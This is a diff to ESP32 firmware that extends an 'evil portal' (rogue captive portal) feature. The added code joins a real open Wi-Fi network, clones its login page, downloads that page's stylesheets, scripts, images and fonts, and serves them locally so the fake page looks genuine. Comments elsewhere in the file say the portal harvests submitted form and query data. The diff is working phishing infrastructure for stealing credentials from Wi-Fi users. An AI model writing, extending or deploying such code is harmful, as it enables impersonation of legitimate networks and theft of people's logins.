@@ -39,6 +39,7 @@
 #include "esp_http_server.h"
 #include "esp_http_client.h"    // live captive-portal page cloning (join a real open AP, fetch its page)
 #include "nucleo_arb.h"         // heavy-work arbiter: ONE TLS/network job at a time (vs ANIMA online)
+#include "nucleo_evilportal_clone.h"   // pure HTML asset rewriter (F2 fidelity)
 #include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB); symbols resolve at link like the externs below
 
 // Restore the saved network on stop (resolved at link; nucleo_setup REQUIRES nucleo_app, so a
@@ -454,6 +455,31 @@ static bool redirect_if_external(httpd_req_t *req)
     return true;
 }
 
+// Serve a mirrored clone asset (F2). The rewritten page references same-origin assets as "/a/<k>.<ext>";
+// they live on SD under PORTAL_TPL"/a". Streamed in 1KB chunks so nothing large sits in RAM.
+static void serve_asset(httpd_req_t *req)
+{
+    static const struct { const char *ext, *mime; } MIMES[] = {
+        { ".css", "text/css" }, { ".js", "application/javascript" }, { ".png", "image/png" },
+        { ".jpg", "image/jpeg" }, { ".jpeg", "image/jpeg" }, { ".gif", "image/gif" },
+        { ".svg", "image/svg+xml" }, { ".webp", "image/webp" }, { ".ico", "image/x-icon" },
+        { ".woff", "font/woff" }, { ".woff2", "font/woff2" }, { ".ttf", "font/ttf" },
+        { ".otf", "font/otf" }, { NULL, NULL },
+    };
+    if (strstr(req->uri, "..")) { httpd_resp_set_status(req, "404 Not Found"); httpd_resp_send(req, NULL, 0); return; }
+    char path[96]; snprintf(path, sizeof path, "%s%s", PORTAL_TPL, req->uri);   // PORTAL_TPL + "/a/<k>.<ext>"
+    FILE *f = fopen(path, "rb");
+    if (!f) { httpd_resp_set_status(req, "404 Not Found"); httpd_resp_send(req, NULL, 0); return; }
+    const char *dot = strrchr(req->uri, '.'); const char *mime = "application/octet-stream";
+    if (dot) for (int i = 0; MIMES[i].ext; i++) if (strcasecmp(dot, MIMES[i].ext) == 0) { mime = MIMES[i].mime; break; }
+    httpd_resp_set_type(req, mime);
+    httpd_resp_set_hdr(req, "Cache-Control", "max-age=86400");
+    char b[1024]; size_t n;
+    while ((n = fread(b, 1, sizeof b, f)) > 0) httpd_resp_send_chunk(req, b, (ssize_t)n);
+    httpd_resp_send_chunk(req, NULL, 0);
+    fclose(f);
+}
+
 static esp_err_t h_get(httpd_req_t *req)
 {
     // Probe / off-portal host -> 302 to the portal (the standard captive flow), not blanket HTML.
@@ -461,6 +487,9 @@ static esp_err_t h_get(httpd_req_t *req)
 
     // Quietly drop the favicon so it doesn't pollute logs or flash a broken icon.
     if (strstr(req->uri, "favicon")) { httpd_resp_set_status(req, "404 Not Found"); httpd_resp_send(req, NULL, 0); return ESP_OK; }
+
+    // Mirrored clone assets (F2): "/a/<k>.<ext>" -> the file streamed from SD with a proper MIME type.
+    if (strncmp(req->uri, "/a/", 3) == 0) { serve_asset(req); return ESP_OK; }
 
     // Some clone pages submit via GET — harvest any query string the same way as a POST body.
     int qlen = httpd_req_get_url_query_len(req);
@@ -763,7 +792,11 @@ esp_err_t nucleo_evilportal_start_twin(const char *ssid, int template_idx, const
 //   * CAP the size -> a runaway/huge response can't exhaust the card or spin forever;
 //   * a re-entrancy flag refuses a second concurrent clone.
 #define CLONE_FILE   PORTAL_TPL "/cloned.html"
-#define CLONE_MAXLEN (192 * 1024)            // a login page is small; refuse anything larger
+#define CLONE_DIR_A  PORTAL_TPL "/a"         // mirrored same-origin assets live here, served as "/a/*"
+// The cloned page is loaded whole into RAM both to serve it (s_tpl_html) and to rewrite its asset
+// refs (F2), so the cap must fit the post-exclusive heap — a login landing page is well under this.
+#define CLONE_MAXLEN (20 * 1024)
+#define CLONE_ASSET_MAXLEN (96 * 1024)       // per-asset download cap (CSS/img); SD has room to spare
 
 static volatile bool s_cloning;
 
@@ -785,6 +818,58 @@ static esp_err_t clone_join_open(const char *ssid)   // associate + wait for an 
     return ESP_ERR_TIMEOUT;
 }
 
+// GET `url` and stream the body to `path` (capped). Returns bytes saved (>=0) or <0 on failure.
+// Used by F2 to mirror the cloned page's same-origin assets (CSS/JS/images/fonts).
+static int clone_fetch_to_file(const char *url, const char *path, long cap)
+{
+    esp_http_client_config_t hc = { 0 };
+    hc.url = url; hc.timeout_ms = 6000; hc.buffer_size = 1024; hc.buffer_size_tx = 512;
+    esp_http_client_handle_t cl = esp_http_client_init(&hc);
+    if (!cl) return -1;
+    if (esp_http_client_open(cl, 0) != ESP_OK) { esp_http_client_cleanup(cl); return -2; }
+    esp_http_client_fetch_headers(cl);
+    int st = esp_http_client_get_status_code(cl);
+    if (st < 200 || st >= 300) { esp_http_client_close(cl); esp_http_client_cleanup(cl); return -3; }
+    FILE *f = fopen(path, "wb");
+    if (!f) { esp_http_client_close(cl); esp_http_client_cleanup(cl); return -4; }
+    char b[512]; long total = 0; int n;
+    while ((n = esp_http_client_read(cl, b, sizeof b)) > 0) {
+        if (total + n > cap) n = (int)(cap - total);
+        if (n <= 0) break;
+        fwrite(b, 1, n, f); total += n;
+        if (total >= cap) break;
+    }
+    fclose(f);
+    esp_http_client_close(cl); esp_http_client_cleanup(cl);
+    return (int)total;
+}
+
+// F2: mirror the cloned page's same-origin assets so it renders like the real thing. Best-effort —
+// any failure just leaves the plain page (which still captures). `base` is the page's final URL.
+static void clone_mirror_assets(const char *base, long pagelen)
+{
+    if (pagelen <= 0 || pagelen > CLONE_MAXLEN || !base || !base[0]) return;
+    char *buf = malloc(pagelen + 1);
+    if (!buf) return;                                // no RAM for F2 -> keep the plain clone
+    FILE *rf = fopen(CLONE_FILE, "rb");
+    long got = rf ? (long)fread(buf, 1, pagelen, rf) : 0;
+    if (rf) fclose(rf);
+    buf[got] = 0;
+
+    ep_asset_t as[EP_ASSET_MAX];
+    int na = ep_collect_assets(buf, base, as, EP_ASSET_MAX);
+    if (na > 0) {
+        FILE *wf = fopen(CLONE_FILE, "wb");          // write back the rewritten (asset-local) HTML
+        if (wf) { fwrite(buf, 1, strlen(buf), wf); fclose(wf); }
+        mkdir(CLONE_DIR_A, 0775);
+        for (int i = 0; i < na; i++) {
+            char path[96]; snprintf(path, sizeof path, "%s%s", PORTAL_TPL, as[i].local);   // .../portals/a/<k>.<ext>
+            clone_fetch_to_file(as[i].url, path, CLONE_ASSET_MAXLEN);
+        }
+    }
+    free(buf);
+}
+
 // Returns bytes saved (>0) on success, or a negative error code (see header). Blocking ~≤20 s.
 int nucleo_evilportal_clone_page(const char *open_ssid)
 {
@@ -800,6 +885,7 @@ int nucleo_evilportal_clone_page(const char *open_ssid)
     nucleo_exclusive_enter(NX_NET_APP, NULL);        // free ~70KB; STA stays up (we need it to join)
 
     int rc = 0;
+    char base[EP_ASSET_URL_MAX] = "";                // the page's final URL (after redirects) for F2
     if (clone_join_open(open_ssid) != ESP_OK) { rc = -10; goto done; }
 
     mkdir(PORTAL_DIR, 0775); mkdir(PORTAL_TPL, 0775);
@@ -815,6 +901,7 @@ int nucleo_evilportal_clone_page(const char *open_ssid)
         if (!cl) { rc = -11; goto done; }
         if (esp_http_client_open(cl, 0) != ESP_OK) { esp_http_client_cleanup(cl); rc = -12; goto done; }
         esp_http_client_fetch_headers(cl);
+        esp_http_client_get_url(cl, base, sizeof base);   // final URL after redirects -> F2 asset base
         int status = esp_http_client_get_status_code(cl);
         if (status == 204 || status == 0) {          // no captive portal -> nothing to clone
             esp_http_client_close(cl); esp_http_client_cleanup(cl); rc = -13; goto done;
@@ -831,6 +918,7 @@ int nucleo_evilportal_clone_page(const char *open_ssid)
         fclose(f);
         esp_http_client_close(cl); esp_http_client_cleanup(cl);
         if (total < 32) { remove(CLONE_FILE); rc = -15; goto done; }    // too small to be a real page
+        clone_mirror_assets(base, total);             // F2: pull same-origin CSS/img (best-effort), still joined
         rc = (int)total;                              // success
     }
 
